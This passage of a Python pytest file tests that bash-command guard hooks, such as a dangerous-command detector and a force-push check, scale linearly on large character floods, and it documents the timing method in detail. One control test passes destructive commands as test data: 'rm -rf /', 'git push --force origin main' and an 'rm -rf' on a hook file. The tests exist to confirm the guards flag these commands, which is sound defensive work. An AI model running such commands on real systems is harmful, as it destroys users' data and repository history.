    # 2.01 / 1.00 -- `_extractor_pair` -> `_cap_for_scan`
    ("removed_or_relocated_operands",
     lambda cmd, root: _bash_patterns.iter_removed_or_relocated_operands(cmd),
     _BASH_COMMAND_CAP),
]


def test_bash_walker_consumers_still_do_the_work(tmp_path):
    """The must-trip control for the budget rows below: a consumer that
    short-circuited on the bare root they run under would pass a timing row
    without walking anything (failure-mode review)."""
    assert write_guard._bash_dangerous_reason("rm -rf /", tmp_path) is not None
    assert _speedbump._pred_forcepush(
        "Bash", {"command": "git push --force origin main"}, tmp_path) is True
    assert _candidate_paths_from_bash("echo x > tools/cc/hooks/x.py")
    assert mask_inert_syntax("echo 'a;b'") == "echo 'a b'"
    assert ("delete", "tools/cc/hooks/x.py") in _bash_patterns.iter_removed_or_relocated_operands(
        "rm -rf tools/cc/hooks/x.py")


@pytest.mark.parametrize("label,payload", _WALKER_FLOODS, ids=[r[0] for r in _WALKER_FLOODS])
def test_bash_walker_linear_on_opener_flood(label, payload, tmp_path):
    """The walker and every consumer in front of the verdict finish a
    64 KB grouping-character flood inside the walker ceiling. RED before the
    fix on every row: the alarm fired at one second of a run that would have
    taken minutes. Every consumer is measured even after one overruns, so a
    red names all of them (failure-mode review). The ceiling is
    `_WALKER_CEILING_MS`, ten times the recorded floor, and catches only a
    runaway: the scaling row below is the detector for shape (DEF-817)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    overruns: list[str] = []
    for name, consumer, _cap in _WALKER_CONSUMERS:
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
        t = time.perf_counter()
        try:
            consumer(payload, tmp_path)
            elapsed_ms = (time.perf_counter() - t) * 1000
        except _Timeout:
            overruns.append(f"{name}: exceeded {_WALKER_CEILING_MS}ms")
            continue
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        if elapsed_ms >= _WALKER_CEILING_MS:
            overruns.append(f"{name}: {elapsed_ms:.1f}ms")
    assert not overruns, f"{label}: " + "; ".join(overruns)


# The scaling arm (DEF-817). The ceiling row above cannot tell a linear
# consumer that is slow from a quadratic one that is short: its worst consumer
# spends more than half of a 1 s budget on a quiet box, so a loaded host reds
# a watch row that saw no regression, while a quadratic consumer that happens
# to finish inside the ceiling passes it. This arm times each consumer at
# the largest flood under the cap its walk is bounded by (the third field
# of `_WALKER_CONSUMERS`; the ceiling row's own sizing rule, so the masker's
# large payload IS the ceiling row's) and at half of that, and holds the
# large time to `_WALKER_LINEAR_RATIO` times the small one plus a noise
# allowance: a linear consumer measures about 2 per doubling, a quadratic
# one about 4, and three is the midpoint. Evidence for the bound, measured
# 2026-09-22 on the 8 GB self-host box at load 1.7 under exactly this
# discipline (TP-454 3-C quotes the driver): 2.00-2.05 per doubling for
# every consumer from 16 KB to 32 KB under the cap and 2.09 for the masker
# from 32 KB to 64 KB, while the extraction-capped consumers went flat
# (1.00-1.01) above 32 KB -- the cap each declaration records. Sizing
# from a quarter and a half of the cap instead (the first draft) put the
# masker at 4.3 ms on its cheapest floods, under any floor that can judge
# it. The timing discipline, each part pinned or driven below:
#   * each consumer is WARMED once on a 64-byte payload before it is timed
#     (the first call pays regex compilation: cold, the speed-bump predicate
#     measured five times its warm cost at the pack's authoring);
#   * the walker's memoised readers (`_WALKER_MEMOISED_READERS`: every
#     `lru_cache` the hook modules define, derived rather than listed) are
#     cleared before EVERY timed call, so a repeated payload cannot read back
#     from a cache (0.0 ms on a second call at authoring);
#   * each size is timed `_WALKER_SAMPLES` times a window (the zero payload
#     twice, below) and the MINIMUM kept: the cost of a deterministic walk is
#     its floor, and a scheduler spike on one
#     call is additive noise (a single 16 KB masker call read 25.8 ms against
#     4.5, 18.9 and 35.7 at the neighbouring sizes on the execution day);
#   * a window INTERLEAVES its samples (small, large, `_WALKER_SAMPLES` times;
#     `_walker_window_ms`), never all of one size and then the other: one
#     slowdown as long as the small samples took lifted the small floor alone,
#     reading a quadratic consumer linear or a linear one flat (DEF-2000,
#     measured at `tests/test_speedbump_irreversible.py::_search_window_ms`,
#     where a lower ratio did no better);
#   * the per-call cost is read INSIDE each window, the zero payload timed at
#     its two ends (:func:`_window_order`), and the window's pair is judged net
#     of that floor: three zero-payload calls read back to back before the
#     first window lifted the cost both windows subtracted under one slowdown
#     over them, and read a linear consumer super-linear on two windows
#     (DEF-2002);
#   * a small-size time under `_WALKER_MIN_SAMPLE_MS` is a RED naming the
#     consumer and its sizes, never a pass: a consumer in the noise cannot be
#     judged, and the fix is to re-declare its cap, never to widen the bound;
#   * the cyclic collector is PAUSED (`gc.disable`, restored after) around
#     every sample: its full collections cost in proportion to the host's live
#     heap, and a larger payload's allocations cross a collection threshold
#     the smaller one's do not, so inside a long pytest process the large
#     sample alone carries the host's collection cost and a linear consumer
#     reads super-linear. Measured 2026-09-23: the release matrix's serial
#     stage 02 (45 minutes of suite in one process) read
#     `_bash_dangerous_reason` at 162.7 -> 496.1 ms on open_paren_run (ratio
#     3.05; 162.9 -> 498.4 the run before, so not a burst -- the first draft
#     called it one and added the second window below on that reading), while
#     a fresh process reads 163 -> 331 (2.03) on the dev tree and on the
#     extracted archive alike; a 4M-object ballast heap in a fresh process
#     moved only the large sample (162 -> 359, 2.22); with the collector
#     paused under the same ballast, 158 -> 319 (2.02). `gc.freeze` reads the
#     same (2.01) but its thaw promotes the young generations into the oldest
#     one (verified on 3.14), a residue the pause does not leave. A hook
#     process starts with a small heap and never pays that term, so it is not
#     the consumer's cost. The CEILING rows stay single samples, and since
#     2026-11-03 they are paused too, by the file-wide pause in
#     `tests/conftest.py::_pause_the_collector_in_the_wall_clock_files`
#     (DEF-5081): they were left unpaused on the reading that the host term
#     eats margin they can spare, which held at the walker tier and failed at
#     the regex tier's 1000 ms, where the release gate's one-process run read
#     a full collection inside `test_binding_pre_pass_linear_on_its_anchor_runs`
#     three runs in a row. Do not widen a ceiling on a stage-02 reading;
#     this arm is the shape detector;
#   * a super-linear reading is CONFIRMED on a second, later window before it
#     reds, and the windows are judged as PAIRS -- the window with the lower
#     ratio is the estimate, and the sample floor is asked again of a chosen
#     second window. Taking the fastest small and the fastest big across
#     windows cannot read below the better window's own ratio
#     (min_big / min_small >= min(r1, r2) under either assignment of the
#     minima), so the mixed estimate the first draft used could confirm a red
#     and never rescue one. The cost of the pair rule, stated beside its
#     benefit: it is strictly MORE permissive -- one clean window now acquits
#     a reading the mixed estimate would have confirmed -- which is why the
#     rows below drive a quadratic stand-in through it (about 4 on EVERY
#     window, still red) as the must-trip control. The second window survives
#     the burst story that first justified it because a one-sided stall (fast
#     small samples, large ones at cost) is a real shape, pinned below.
# The two floors are coupled by the detection inequality: a quadratic
# consumer at small time t measures about 4t, and the bound admits
# 3t + noise, so it is caught only while t exceeds the noise floor; the
# sample floor is twice the noise floor so a consumer judged at the floor
# still overruns the bound by a full noise floor. (The first draft set both
# at 5 ms, where a quadratic consumer at the floor passes exactly; the
# second set 2 and 4 ms, which left the masker's cheapest floods 2.1x over
# the sample floor -- a box twice as fast would red them.) A 1 ms allowance
# is the per-call overhead plus the jitter that survives a minimum of three:
# the warm table's minima agreed to a few tenths of a millisecond, and the
# masker's cheapest small sample (8.6 ms at 32 KB) sits 4x over the floor.
# The FLAT bound is the other refutation: a consumer that measures near 1
# per doubling between its two sizes is bounded by a SMALLER cap than the
# one declared beside it (a length guard added later, say) and measured
# nothing -- the row reds naming it, so the declaration is re-measured
# instead of the detector retiring silently (failure-mode review). Linear
# consumers measured 2.00-2.09; the partly-capped two measured 1.31 and
# 1.62 ABOVE the 32 KB cap they are declared under: the shape this catches.
_WALKER_LINEAR_RATIO = 3.0
_WALKER_FLAT_RATIO = 1.5
_WALKER_NOISE_FLOOR_MS = 1.0  # jitter, additive; the per-call cost is MEASURED per run (see the scaling row)
_WALKER_MIN_SAMPLE_MS = 2 * _WALKER_NOISE_FLOOR_MS
_WALKER_SAMPLES = 3


def _walker_sizes(cap: int) -> tuple[int, int]:
    """The scaling row's (large, small) byte counts for a consumer bounded
    by ``cap``: the largest flood under the cap by the ceiling row's own rule
    (``_WALKER_FLOOD_LEN`` is ``_ROLE_MAP_CAP - 64``), and half of it."""
    big = cap - 64
    return big, big // 2


def _is_swamped(t_zero: float, net_small: float, *, floor_ms: float = _WALKER_MIN_SAMPLE_MS) -> bool:
    """The sample-floor arm's host question (DEF-926; ``floor_ms`` is the arm's
    sample floor, so the PowerShell arm asks it at its own): True when the measured
    per-call cost both exceeds what is left of the small sample once it is
    subtracted AND would itself clear the sample floor -- a host paying more to
    rebuild the memoised readers than the floors' host paid for a whole sample
    (about 1 ms there; 195 ms on the 2026-09-25 shared runner). The second arm
    keeps a fast box honest: the ratio alone is scale-free, so 0.5 ms of
    per-call cost over a 0.3 ms net sample would read as swamped when it is a
    box faster than the floors' host (the failure-mode review's case) -- that
    one keeps the fast-box red and its re-measure remedies."""
    return t_zero > net_small and t_zero >= floor_ms


def _sample_floor_text(
    name: str, n_small: int, t_small: float, t_zero: float, *, swamped: bool, window: str = "",
) -> str:
    """The sentence for a small sample under `_WALKER_MIN_SAMPLE_MS`, by cause
    (DEF-926). Two hosts read the same net number and want opposite remedies.
    ``swamped`` -- the caller measured the per-call cost ABOVE what is left of
    the sample once it is subtracted -- is a slow shared runner: the host paid
    more to rebuild the memoised readers than to walk the payload (the
    2026-09-25 Release CI run on `main` read `candidate_paths_from_bash` at
    196.1 ms for the small sample, most of it per-call), the sample is
    unjudgeable there, and re-measuring the floors on a quiet box would change
    nothing. Not swamped is the box much faster than the floors' host, a cheaper
    consumer, or a cap too small for its walk -- each a re-measure. Until
    2026-10-09 one message diagnosed every case as the fast box, and the
    maintainer reading a red release-readiness job followed it to a box that
    was not the problem."""
    net_small = t_small - t_zero
    if swamped:
        return (
            f"{name}: {t_small:.1f}ms at {n_small} bytes is mostly the {t_zero:.1f}ms "
            f"per-call cost ({net_small:.1f}ms net{window}), so this host's rebuild of the "
            "memoised readers swamps the sample and its ratio cannot be judged here: a slow "
            "shared runner, not a fast box -- re-run on a quiet host; the floors are not the "
            "problem, and never widen the bound"
        )
    return (
        f"{name}: {t_small:.1f}ms at {n_small} bytes ({net_small:.1f}ms net of the "
        f"{t_zero:.1f}ms per-call cost{window}) is under the {_WALKER_MIN_SAMPLE_MS}ms "
        "sample floor, so its ratio cannot be judged: this box is much faster than the one "
        "the floors were measured on (re-measure, lower both floors together), the consumer "
        "got cheaper (re-measure), or its declared cap is too small for its walk "
        "(re-declare it); never widen the bound"
    )

# Every lru_cache-wrapped callable the three hook modules define -- the
# readers a repeated payload would hit. Derived from the modules so a reader
# memoised tomorrow is cleared without an edit here; the pin below names the
# five that existed at authoring so a renamed one is caught.
_WALKER_MEMOISED_READERS = tuple(
    obj
    for mod in (_bash_patterns, write_guard, _speedbump)
    for obj in vars(mod).values()
    if hasattr(obj, "cache_clear")
    and getattr(getattr(obj, "__wrapped__", None), "__module__", None) == mod.__name__
)


def _clear_walker_caches() -> None:
    for reader in _WALKER_MEMOISED_READERS:
        reader.cache_clear()


def _walker_alarmed_ms(
    consumer: Callable[[str, Path], object], payload: str, root: Path,
) -> float | None:
    """One call under the alarm, caches cleared first; None when it overran
    `_WALKER_CEILING_MS` (the alarm fires inside the call, so a runaway costs
    one ceiling, not minutes). The warm call reads this directly (DEF-5023: it
    had no alarm); a window's samples read it through :func:`_walker_call_ms`,
    the seam the simulated-clock rows replace. On a host without SIGALRM
    (Windows) it skips the test that reached it, the warm call of a
    simulated-clock row included."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("the walker timer arms signal.SIGALRM, not available on this platform")
    _clear_walker_caches()
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
    t0 = time.perf_counter()
    try:
        consumer(payload, root)
        signal.setitimer(signal.ITIMER_REAL, 0)  # disarm before anything else can be interrupted
        return (time.perf_counter() - t0) * 1000
    except _Timeout:
        return None
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)


def _walker_call_ms(
    consumer: Callable[[str, Path], object], payload: str, root: Path,
) -> float | None:
    """One timed sample of a window (:func:`_walker_alarmed_ms`). The caller
    pauses the cyclic collector."""
    return _walker_alarmed_ms(consumer, payload, root)


def _pyproject_timeout_s() -> float:
    """pytest's per-test `timeout` as pyproject.toml's pytest table declares it,
    read and never copied, through the one reader the suite shares
    (`tests/_pytest_ini.py`, scoped to `[tool.pytest.ini_options]`)."""
    return float(declared_pytest_timeout())


#: What the walker row does outside its capped calls, inside the per-test timeout:
#: the fixture's setup and teardown, building each payload, judging, the red's
#: text. Measured on the Air (2026-10-18): the 8.5 s-a-call drive spent 0.7 s
#: outside its calls before its red, so this is about seven times that.
_WALKER_BUDGET_MARGIN_S = 5.0


def _walker_row_budget_s(timeout_s: float) -> float | None:
    """The walker scaling row's time for one label, inside pytest's per-test
    ``timeout_s`` (DEF-5023): the row judges five consumers in one test, each
    up to two windows of capped calls, 704 s at the ceiling against 60, and a
    timeout kill reports no reading at all. One ceiling and
    `_WALKER_BUDGET_MARGIN_S` under the timeout: the stop check lets a call
    start only while one ceiling still fits in the budget, so the calls end by
    it; the ceiling under the timeout is room for one alarm that fires late
    (Python runs the handler only between bytecodes, so a long C-level call can
    carry a call past its ceiling), and the margin covers the rest. The healthy labels on the full tier's
    serial cells read up to 10.3 s (ten cells, 2026-10-18), against the 37.4 s
    after which no call starts. None with no timeout. It reads the declared
    timeout: a run that raises the ceiling (`PYTEST_TIMEOUT`, `--timeout`, a
    mark) does not widen it, and one that lowers it below is not read.
    Coupled to `_WALKER_CEILING_MS`: raising the ceiling shrinks the time in
    which a call may start (the timeout less two ceilings and the margin)."""
    if timeout_s <= 0:
        return None
    return timeout_s - _WALKER_CEILING_MS / 1000.0 - _WALKER_BUDGET_MARGIN_S


#: The walker row's clock for its time budget; the simulated-clock rows replace it.
_walker_clock = time.monotonic


class _WalkerBudgetSpent(Exception):
    """The walker row's time budget would run out before the next capped call:
    ``where`` names the call that was not started, ``floors`` the samples its
    window took so far (zero, small, big)."""

    def __init__(self, where: str, floors: tuple[list[float], list[float], list[float]] | None = None):
        super().__init__(where)
        self.where = where
        self.floors = floors


def _check_walker_budget(
    deadline: float | None, where: str,
    floors: tuple[list[float], list[float], list[float]] | None = None,
) -> None:
    """The stop check before every capped call of the walker row: a call that,
    running its full ceiling, could end past ``deadline`` is not started (DEF-5023)."""
    if deadline is not None and _walker_clock() + _WALKER_CEILING_MS / 1000.0 > deadline:
        raise _WalkerBudgetSpent(where, floors)


def _walker_window_ms(
    consumer: Callable[[str, Path], object], big: str, small: str, zero: str, root: Path,
    *, deadline: float | None = None, window: int = 1,
) -> tuple[float, float, float] | int:
    """One window of the scaling row: ``(t_zero_ms, t_small_ms, t_big_ms)``, the
    floor of each size's timings in :func:`_window_order` (`_WALKER_SAMPLES` at
    each size, interleaved, the zero payload at the window's two ends), caches
    cleared before each call and the cyclic collector paused throughout,
    restored after (the discipline above: a long pytest process's full
    collections are the host's cost, and only the larger payload triggers
    them); when a call overran `_WALKER_CEILING_MS`, its payload's length
    (:func:`_overran`). The interleave narrows a slowdown's lift of the small
    floor alone, which read a quadratic consumer linear and a linear one flat,
    and does not close it (DEF-2000; :func:`_window_order` says how; the
    measurement is at `tests/test_speedbump_irreversible.py::_search_window_ms`),
    and the window's pair is judged net of its own zero floor (DEF-2002). Each
    call is preceded by the row's stop check (:func:`_check_walker_budget`),
    which raises with the samples so far when ``deadline`` is too near."""
    floors: tuple[list[float], list[float], list[float]] = ([], [], [])
    order = _window_order(zero, small, big, _WALKER_SAMPLES)
    collector_was_on = gc.isenabled()
    gc.disable()
    try:
        for i, (floor, payload) in enumerate(order):
            _check_walker_budget(deadline, f"window {window}, after {i} of its {len(order)} calls", floors)
            elapsed_ms = _walker_call_ms(consumer, payload, root)
            if elapsed_ms is None:
                return len(payload)
            floors[floor].append(elapsed_ms)
    finally:
        if collector_was_on:
            gc.enable()
    return min(floors[0]), min(floors[1]), min(floors[2])


def _walker_scaling_judgement(
    name: str, consumer: Callable[[str, Path], object], cap: int,
    make: Callable[[int], str], root: Path,
    *, deadline: float | None = None, readings: dict[str, str] | None = None,
) -> tuple[str | None, str | None]:
    """The scaling row's reading of one consumer: ``(problem, unjudged)``, at
    most one of them set -- a problem reds the row, an unjudged sample is the
    DEF-926 skip with its cause, and ``(None, None)`` is a linear reading, whose
    ratio goes in ``readings[name]``. Every capped call, the warm one included,
    is preceded by the row's stop check against ``deadline``
    (:class:`_WalkerBudgetSpent` names where it stopped, DEF-5023)."""
    n_big, n_small = _walker_sizes(cap)
    big, small = make(n_big), make(n_small)
    if len(big) >= cap:  # a problem, not an assert: every consumer is still measured
        return (
            f"{name}: {len(big)} bytes is not under the {cap}-byte cap the "
            "consumer is declared under -- above it the walk is flat"
        ), None
    zero = make(64)
    # warm: the first call pays compilation, under the alarm like every timed one
    _check_walker_budget(deadline, "the warm call")
    if _walker_alarmed_ms(consumer, zero, root) is None:
        return f"{name}: exceeded {_WALKER_CEILING_MS}ms on the warm call", None
    # each window reads the per-call cost on THIS host at its two ends (DEF-2002)
    first = _walker_window_ms(consumer, big, small, zero, root, deadline=deadline, window=1)
    if isinstance(first, int):
        return f"{name}: exceeded {_WALKER_CEILING_MS}ms {_overran(first, zero)}", None

    def floor_reading(text: str, swamped: bool) -> tuple[str | None, str | None]:
        return (None, text) if swamped else (text, None)

    t_zero, t_small, t_big = first
    net_small, net_big = t_small - t_zero, t_big - t_zero
    if net_small < _WALKER_MIN_SAMPLE_MS:
        # DEF-926: a per-call cost above the net sample is a slow host, not a fast
        # one; the sample is unjudgeable here and the row skips with that cause
        # instead of redding with the other
        swamped = _is_swamped(t_zero, net_small)
        return floor_reading(_sample_floor_text(name, len(small), t_small, t_zero, swamped=swamped), swamped)
    bound = _WALKER_LINEAR_RATIO * net_small + _WALKER_NOISE_FLOOR_MS
    windows = ""
    if net_big > bound or net_big < _WALKER_FLAT_RATIO * net_small:
        # a second, later window, judged as its OWN pair. For the
        # super-linear question the window with the LOWER ratio is the
        # estimate (noise inflates the big sample); for the flat question
        # the HIGHER (noise inflates the small one). Mixing the fastest
        # small with the fastest big across windows cannot read below the
        # better window's own ratio -- the discipline above.
        if readings is not None:
            # the reason the second window runs, kept for a red the budget gives inside it
            readings[name] = (
                f"window 1 read {t_small:.1f} -> {t_big:.1f}ms (ratio {net_big / net_small:.2f} net of its "
                f"{t_zero:.1f}ms), {'super-linear' if net_big > bound else 'flat'}, so a second window was asked"
            )
        second = _walker_window_ms(consumer, big, small, zero, root, deadline=deadline, window=2)
        if isinstance(second, int):
            return f"{name}: exceeded {_WALKER_CEILING_MS}ms {_overran(second, zero)} on the second window", None
        t_zero_2, t_small_2, t_big_2 = second
        net_small_2, net_big_2 = t_small_2 - t_zero_2, t_big_2 - t_zero_2
        r1 = net_big / net_small
        r2 = net_big_2 / net_small_2 if net_small_2 >= _WALKER_MIN_SAMPLE_MS else None
        if r2 is None:
            swamped = _is_swamped(t_zero_2, net_small_2)
            return floor_reading(_sample_floor_text(
                name, len(small), t_small_2, t_zero_2, swamped=swamped,
                window=(
                    f" on the second window; the first read {t_small:.1f} -> {t_big:.1f}ms "
                    f"(ratio {r1:.2f} net of its {t_zero:.1f}ms)"
                ),
            ), swamped)
        chosen_lower = net_big > bound and r2 < r1
        chosen_higher = net_big < _WALKER_FLAT_RATIO * net_small and r2 > r1
        if chosen_lower or chosen_higher:
            t_zero, t_small, t_big = t_zero_2, t_small_2, t_big_2
            net_small, net_big = net_small_2, net_big_2
            bound = _WALKER_LINEAR_RATIO * net_small + _WALKER_NOISE_FLOOR_MS
            windows = (
                f"; the first window read {first[1]:.1f} -> {first[2]:.1f}ms (ratio {r1:.2f} net "
                f"of its {first[0]:.1f}ms) "
                f"and the second was chosen for its {'lower' if chosen_lower else 'higher'} ratio"
            )
    ratio = net_big / net_small
    if net_big > bound:
        return (
            f"{name}: {t_small:.1f}ms at {len(small)} bytes -> {t_big:.1f}ms "
            f"at {len(big)} bytes ({net_small:.1f} -> {net_big:.1f}ms net of the "
            f"{t_zero:.1f}ms per-call cost; ratio {ratio:.2f}, bound {bound:.1f}ms): "
            f"super-linear on two windows{windows}"
        ), None
    if net_big < _WALKER_FLAT_RATIO * net_small:
        return (
            f"{name}: {t_small:.1f}ms at {len(small)} bytes -> {t_big:.1f}ms "
            f"at {len(big)} bytes ({net_small:.1f} -> {net_big:.1f}ms net of the "
            f"{t_zero:.1f}ms per-call cost; ratio {ratio:.2f}, under {_WALKER_FLAT_RATIO}): "
            "flat on two windows, so the walk is bounded by a smaller cap than the one "
            f"declared beside the consumer and this row measured nothing; re-declare it{windows}"
        ), None
    if readings is not None:
        readings[name] = f"linear, ratio {ratio:.2f} ({net_small:.1f} -> {net_big:.1f}ms net)"
    return None, None


def _walker_budget_text(
    label: str, name: str, spent: _WalkerBudgetSpent, budget_s: float, readings: dict[str, str],
    problems: list[str], unjudged: list[str], not_reached: list[str],
) -> str:
    """The walker row's red when its time budget runs out (DEF-5023): where it
    stopped, the samples the window in flight took (and its first window's
    reading when it stopped in the second), each finished consumer's reading in
    the row's order, the consumers not reached, and the likely cause. Two causes
    read alike in the time alone, so the sentence says which the readings point
    to, never one remedy for both (DEF-926's lesson): every finished consumer
    linear or swamped, no call in flight near the ceiling and no first window
    out of bound is a slow host; anything else is a consumer that regressed."""
    finished: list[str] = []
    regressed = False
    for done, _consumer, _cap in _WALKER_CONSUMERS:
        if done == name:
            break
        red = next((p for p in problems if p.startswith(f"{done}:")), None)
        if red is not None:
            finished.append(f"{done} red ({red[len(done) + 2:]})")
            regressed = True
        elif any(u.startswith(f"{done}:") for u in unjudged):
            finished.append(f"{done} unjudged (swamped)")
        elif done in readings:
            finished.append(f"{done} {readings[done]}")
    in_flight = f"; {readings[name]}" if name in readings else ""
    regressed = regressed or bool(in_flight)
    samples = ""
    if spent.floors is not None:
        zero, small, big = (", ".join(f"{ms:.1f}" for ms in f) or "none" for f in spent.floors)
        samples = f"; its samples so far (ms): zero {zero}, small {small}, big {big}"
        near = [ms for f in spent.floors for ms in f if ms >= _WALKER_CEILING_MS / 2]
        regressed = regressed or bool(near)
    cause = (
        "A consumer regressed toward its ceiling, or read out of bound, and the ones after it are "
        "unjudged in this run: fix it, then re-run" if regressed else
        "Every reading so far is linear or swamped and no call in flight came near the ceiling: most "
        "likely a slow host, so re-run on a quiet one; neither the budget nor a ceiling is the problem"
    )
    return (
        f"{label}: the row's time budget ({budget_s:.1f}s, inside the {_pyproject_timeout_s():.0f}s "
        f"per-test timeout pyproject declares) would run out before the next call of {name} "
        f"({spent.where}{samples}{in_flight}), so it stops here and reds with what it read rather "
        "than be killed with nothing: finished "
        + ("; ".join(finished) or "none")
        + "; not reached " + (", ".join(not_reached) or "none")
        + ". " + cause
    )


@pytest.mark.parametrize("label,make", _WALKER_FLOOD_MAKERS, ids=[r[0] for r in _WALKER_FLOOD_MAKERS])
def test_bash_walker_scales_linearly_on_opener_flood(label, make, tmp_path):
    """Each consumer's cost at the largest flood under its cap is at most
    `_WALKER_LINEAR_RATIO` times its cost at half of that, plus the noise floor,
    and no less than `_WALKER_FLAT_RATIO` times it (a flat reading says the walk
    is bounded below its declared cap and nothing was measured) -- DEF-817:
    the ceiling row cannot tell a linear consumer that is slow from
    a quadratic one that is short, and this row can. Who: the maintainer whose
    tier reds on the ceiling row under load and spends a run bisecting a
    regression that is not there, and the adopter whose hook a quadratic
    walker would time out on a pasted command the ceiling still passed. RED
    against a stand-in consumer that rescans the remainder once per position
    (ratio about 4) while the ceiling row passes it at `_WALKER_CEILING_MS`,
    and GREEN again on the same stand-in with the ratio at 5.0, so the bound
    is load-bearing (TP-454 3-C records both runs). Every consumer is
    measured even after one fails, so a red names all of them -- unless the
    time budget below stops the row first, when the red names the ones it did
    not reach.

    Both ratios are judged NET of a measured per-call cost, and both arms get
    a second window. The first CI runs after Actions came back (2026-09-23)
    read `mixed_openers` on a shared 3.13 runner as 241.5 -> 284.2 ms, ratio
    1.18, and called it flat: every sample clears the memoised readers and
    pays their rebuild, a cost that scales with the host, not the payload --
    about 1 ms here, which the additive noise floor was sized for, and well
    over a hundred on that runner, where it swamped the half-cap window. The
    zero-payload call (`make(64)`, the warm call's payload), timed at each
    window's two ends, measures that cost on the host the row runs on, inside
    the window it is subtracted from (DEF-2002); a truly flat walk still reads
    about one after the subtraction, and the quadratic stand-in the twin
    below drives still reads about four.

    The row runs inside a time budget (DEF-5023): five consumers, each up to
    two windows of capped calls, read 704 s at the ceiling against pytest's
    60 s per-test timeout, and a timeout kill reports no reading at all. A call
    is started only while one ceiling still fits in :func:`_walker_row_budget_s`,
    so a consumer regressed toward its ceiling reds here with the readings so
    far, in the fixed order of `_WALKER_CONSUMERS`: the consumer and window in
    flight, each finished consumer's reading, the ones not reached, and which
    cause the readings point to (a slowed consumer, or a slow host where every
    reading is linear or swamped). Its cost: one regressed consumer leaves the
    ones after it unjudged in that run."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    problems: list[str] = []
    unjudged: list[str] = []  # DEF-926: samples a slow host swamped, skipped with the cause
    budget_s = _walker_row_budget_s(_pyproject_timeout_s())
    deadline = None if budget_s is None else _walker_clock() + budget_s
    readings: dict[str, str] = {}
    for at, (name, consumer, cap) in enumerate(_WALKER_CONSUMERS):
        stopped: _WalkerBudgetSpent | None = None
        try:
            problem, skipped = _walker_scaling_judgement(
                name, consumer, cap, make, tmp_path, deadline=deadline, readings=readings)
        except _WalkerBudgetSpent as spent:
            stopped = spent
        if stopped is not None:  # failed outside the except, so the red is its own text alone
            pytest.fail(_walker_budget_text(label, name, stopped, budget_s or 0.0, readings, problems, unjudged,
                                            [n for n, _c, _cap in _WALKER_CONSUMERS[at + 1:]]))
        if problem is not None:
            problems.append(problem)
        if skipped is not None:
            unjudged.append(skipped)
    assert not problems, f"{label}: " + "; ".join(problems)
    if unjudged:
        # a row that judged NOTHING is a red, not a skip: a skip nobody counts could
        # retire the scaling guard on a slow runner for good (the failure-mode review;
        # .github/workflows/test.yml's rg gate is the precedent) -- the message still
        # names the host, never the floors
        assert len(unjudged) < len(_WALKER_CONSUMERS), (
            f"{label}: every consumer's sample was swamped by this host's per-call cost, so "
            "this row measured nothing here -- a slow shared runner; re-run on a quiet host, "
            "the floors are not the problem: " + "; ".join(unjudged)
        )
        pytest.skip(f"{label}: the sample floor was not cleared, by cause -- " + "; ".join(unjudged))


def test_is_swamped_needs_an_absolute_per_call_cost():
    """DEF-926, sharpened by the failure-mode review: the swamped reading needs
    the per-call cost above the net sample AND above the sample floor. The
    2026-09-25 runner is swamped; a fast box with a sub-floor per-call cost is
    not, whatever the ratio says; a sample that clears the floor is never asked."""
    assert _is_swamped(195.0, 1.1)          # the incident: most of 196.1 ms was per-call
    assert _is_swamped(2.5, 1.0)            # per-call cost itself clears the floor
    assert not _is_swamped(0.5, 0.3)        # the fast box: ratio says swamped, magnitude says no
    assert not _is_swamped(1.5, 1.0)        # under the floor: still the fast-box diagnosis
    assert not _is_swamped(3.0, 5.0)        # the sample clears the floor; the arm is not reached
    assert _WALKER_MIN_SAMPLE_MS == 2.0     # the arm reads the floor; a floor change re-measures this
    # the PowerShell arm asks at its own 5 ms floor (DEF-2002): 3 ms of per-call cost over 1 ms
    # net is swamped on the walker and a fast box there
    assert _is_swamped(3.0, 1.0) and not _is_swamped(3.0, 1.0, floor_ms=_PS_BODY_MIN_SAMPLE_MS)


def test_sample_floor_text_names_the_host_by_cause():
    """DEF-926: the swamped reading (per-call cost above the net sample) is a slow
    host and says so; the fast reading keeps the re-measure remedies. The two
    texts must not share a diagnosis -- the red this closes followed the fast-box
    message to re-measure floors on a box that was not the problem."""
    slow = _sample_floor_text("walker", 1024, 196.1, 195.0, swamped=True)
    fast = _sample_floor_text("walker", 1024, 2.4, 1.0, swamped=False)
    assert "slow shared runner" in slow and "195.0ms" in slow and "faster" not in slow
    assert "much faster" in fast and "re-measure" in fast and "slow shared runner" not in fast
    for text in (slow, fast):
        assert "never widen the bound" in text
    second = _sample_floor_text("walker", 1024, 2.4, 1.0, swamped=False, window=" on the second window")
    assert "on the second window" in second


def test_walker_sizes_follow_the_ceiling_rows_rule():
    """The masker's large payload in the scaling row is the ceiling row's
    own flood, so the two rows read one size rule and one cap; a consumer
    under the extraction cap is sized under it with the same margin."""
    assert _walker_sizes(_ROLE_MAP_CAP) == (_WALKER_FLOOD_LEN, _WALKER_FLOOD_LEN // 2)
    big, small = _walker_sizes(_BASH_COMMAND_CAP)
    assert small < big < _BASH_COMMAND_CAP and _BASH_COMMAND_CAP - big == _ROLE_MAP_CAP - _WALKER_FLOOD_LEN
    assert _WALKER_MIN_SAMPLE_MS > _WALKER_NOISE_FLOOR_MS  # the detection inequality
    # the two ratio bounds bracket a linear consumer (2) and exclude a quadratic one (4)
    assert 1.0 < _WALKER_FLAT_RATIO < 2.0 < _WALKER_LINEAR_RATIO < 4.0


def test_walker_scaling_row_clears_the_memoised_readers():
    """The scaling row's clear empties every memoised reader the consumers run
    through, driven by the cache's own counters rather than by timing (a
    best-of-three with a repeated payload read `removed_or_relocated_operands`
    back at 0.0 ms at the pack's authoring, which is the false green the clear
    exists to foreclose). The derived roster covers the five readers that
    existed at authoring, so a renamed one is caught here."""
    named = {
        "_removed_or_relocated_cached", "_wall_readings", "_relief_applies",
        "_nested_shell_programs_cached", "_resolve_bash_discovered_heads",
    }
    roster = {reader.__wrapped__.__name__ for reader in _WALKER_MEMOISED_READERS}
    assert named <= roster, sorted(named - roster)
